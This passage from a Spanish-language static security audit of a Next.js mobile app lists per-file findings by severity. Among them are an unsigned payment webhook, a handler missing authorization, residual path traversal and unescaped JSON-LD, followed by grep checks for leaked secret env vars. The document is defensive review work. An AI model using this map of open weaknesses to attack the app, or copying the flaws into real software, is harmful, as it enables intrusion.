apps/mobile/src/lib/auth.ts:7               🟡 SECRET cacheado top-level — rotación requiere restart
apps/mobile/src/lib/auth.ts:13              🔵 bcrypt cost 10 → subir a 12
apps/mobile/src/lib/auth.ts:16-23           🟡 JWT sin iss/aud/jti
apps/mobile/src/lib/auth.ts:44              🟡 sameSite:"lax" (ver #8)
apps/mobile/src/lib/session-store.ts:20-62  ✅ BIEN — Session DB con revoked+expiresAt, lastUsed update
apps/mobile/src/lib/rate-limiter.ts:36-154  🟠 Map en memoria — no funciona en serverless
apps/mobile/src/lib/rate-limiter-advanced.ts:30-378 ⚠️ dead code — ratelimiter duplicado nunca usado por middleware
apps/mobile/src/lib/login-guard.ts:16-56    🟡 También en memoria — bloquear por cuenta distribuido falta
apps/mobile/src/lib/authorization.ts:16-139 ✅ BIEN — ownership centralizado, fail-closed
apps/mobile/src/lib/security.ts:9-88        ✅ BIEN — pero no consumido por uploads handlers (divergencia)
apps/mobile/src/lib/validations.ts:10-21    ✅ BIEN — loginSchema/registerSchema estrictos; register fuerza CLIENT
apps/mobile/src/middleware.ts:23-45         🟡 rateLimit por IP OK pero in-memory
apps/mobile/src/middleware.ts:53-110        🟡 solo jwtVerify sin validateSession (by design edge, OK si getSession revalida)
apps/mobile/next.config.mjs:58-68           🟡 CSP unsafe-inline + img-src wildcard
apps/mobile/src/app/api/auth/register/route.ts:41 🔴 createToken sin Session
apps/mobile/src/app/api/checkins/route.ts:125-150 🔴 PATCH sin authZ
apps/mobile/src/app/api/clients/[id]/route.ts:108-124 🟠 PATCH sin Zod
apps/mobile/src/app/api/messages/route.ts:67-103 🟠 content sin sanitize/slice
apps/mobile/src/app/api/uploads/route.ts:69-115 🟠 ALLOWED_TYPES divergente + wildcard MIME
apps/mobile/src/app/api/uploads/[...path]/route.ts:38-54 🟠 permite lectura path distinto a escritura
apps/mobile/src/app/api/uploads/serve/route.ts:28-44 🟠 tercera lista allowedTypes
apps/mobile/src/app/api/payments/webhook/route.ts:114-135 🔴 MP sin firma
apps/mobile/src/app/api/health/route.ts:14-27 🟡 info-leak
apps/mobile/src/app/api/backups/[id]/route.ts:34-44 🟡 traversal residual
apps/mobile/src/lib/seo-optimizer.tsx:212 🟠 JSON-LD sin escape </script>
```

---

## Notas de auditoría

- **Prisma injection:** verificado con `grep \$queryRaw|\$executeRaw` — cero resultados en `src/`; todas las queries usan Prisma typed builder → ✅ mitigado.
- **Env leakage client-side:** `grep NEXT_PUBLIC.*SECRET|JWT|DATABASE|SUPABASE_SERVICE|SMTP_PASS|STRIPE_SECRET` — cero leaks en `src/`; todas las env sensibles son server-only (`process.env.X` sin `NEXT_PUBLIC_`).
- **XSS `dangerouslySetInnerHTML`:** solo 2 usos en codebase (layout theme-script estático ✅ y seo-optimizer JSON-LD ⚠️).
- **Dependencias:** `jose@6.0.11`, `zod@3.25.76`, `bcryptjs@3.0.2` al día; audit residual `deepmerge-ts` es `devDependency` de `@prisma/config` — no runtime.

---

*Auditoría generada por revisión estática manual. Re-auditar tras PR1+PR2 antes de cierre de release. Próxima auditoría programada post-fix: DAST con `OWASP ZAP` + test de penetración sobre los 3 handlers de uploads y flujo register→login→logout.*
